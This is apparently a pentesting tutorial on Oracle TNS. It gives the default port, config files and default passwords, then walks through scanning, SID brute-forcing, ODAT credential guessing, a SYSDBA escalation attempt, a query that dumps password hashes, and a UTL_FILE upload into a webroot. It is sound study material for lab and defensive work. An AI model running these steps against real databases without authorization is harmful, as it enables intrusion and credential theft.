
### What is Oracle TNS?

Oracle TNS (Transparent Network Substrate) is a communication protocol used by **Oracle Corporation** databases to allow clients and applications to connect over a network.

It is part of Oracle Net Services and enables:

* Client ↔ Database communication
* Encrypted data transmission
* Load balancing
* Name resolution
* Connection management

TNS typically runs on TCP port 1521 by default.

---

# Architecture Overview

Oracle TNS works through:

## 1) Listener (Server-side)

* Listens on TCP/1521
* Defined in `listener.ora`
* Forwards client requests to the correct database instance

## 2) Client Configuration

* Uses `tnsnames.ora`
* Maps service name to IP, Port, and SID

---

# Important Configuration Files

| File         | Location                   | Purpose                        |
| ------------ | -------------------------- | ------------------------------ |
| tnsnames.ora | $ORACLE_HOME/network/admin | Client-side service resolution |
| listener.ora | $ORACLE_HOME/network/admin | Listener configuration         |

---

# Important Connection Parameters

| Setting      | Description          |
| ------------ | -------------------- |
| DESCRIPTION  | Database descriptor  |
| ADDRESS      | Host and Port        |
| PROTOCOL     | TCP / IPC            |
| PORT         | Default 1521         |
| SERVICE_NAME | Database service     |
| SID          | Database instance ID |
| USER         | Username             |
| PASSWORD     | Password             |

---

# Default Configuration Notes

* Default port: 1521
* Remote management allowed by default in Oracle 8i/9i
* Not allowed by default in Oracle 10g/11g
* Older versions:

  * Oracle 9 default password: CHANGE_ON_INSTALL
  * Oracle DBSNMP default password: dbsnmp

---

# Pentesting Oracle TNS

Structured attack flow:

---

## 1) Scan for Oracle TNS

```bash
sudo nmap -p1521 -sV <target-ip> --open
```

Example:

```
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0
```

---

## 2) SID Bruteforce

```bash
sudo nmap -p1521 --script oracle-sid-brute <target-ip>
```

Example output:

```
| oracle-sid-brute:
|_ XE
```

SID discovered: XE

---

## 3) Use ODAT (Oracle Database Attacking Tool)

Tool: ODAT

```bash
./odat.py all -s <target-ip>
```

Example result:

```
Valid credentials found: scott/tiger
```

---

## 4) Login Using SQLPlus

```bash
sqlplus scott/tiger@<target-ip>/XE
```

If shared library error appears:

```bash
sudo ldconfig
```

---

# Manual Enumeration Inside Database

## List Tables

```sql
select table_name from all_tables;
```

## Check Roles

```sql
select * from user_role_privs;
```

---

# Privilege Escalation Attempt

```bash
sqlplus scott/tiger@<target-ip>/XE as sysdba
```

If successful, you gain administrative privileges.

---

# Extract Password Hashes

```sql
select name, password from sys.user$;
```

Hashes can then be cracked offline.

---

# File Upload via UTL_FILE

Create test file:

```bash
echo "Oracle File Upload Test" > testing.txt
```

Upload:

```bash
./odat.py utlfile -s <target-ip> -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

Verify:

```bash
curl http://<target-ip>/testing.txt
```

Expected output:

```
Oracle File Upload Test
```

---

# Common Exploitation Paths

* Default credentials
* Weak passwords
* SID brute forcing
* SYSDBA misuse
* UTL_FILE file upload
* Extracting password hashes
* Uploading web shell if web server is present

---

# Key Pentesting Takeaways

1. Always scan port 1521.
2. Enumerate SID.
3. Use ODAT for automation.
4. Try default credentials (scott/tiger, dbsnmp/dbsnmp).
5. Attempt SYSDBA access.
6. Dump password hashes if possible.
7. Attempt file upload if a web server exists.
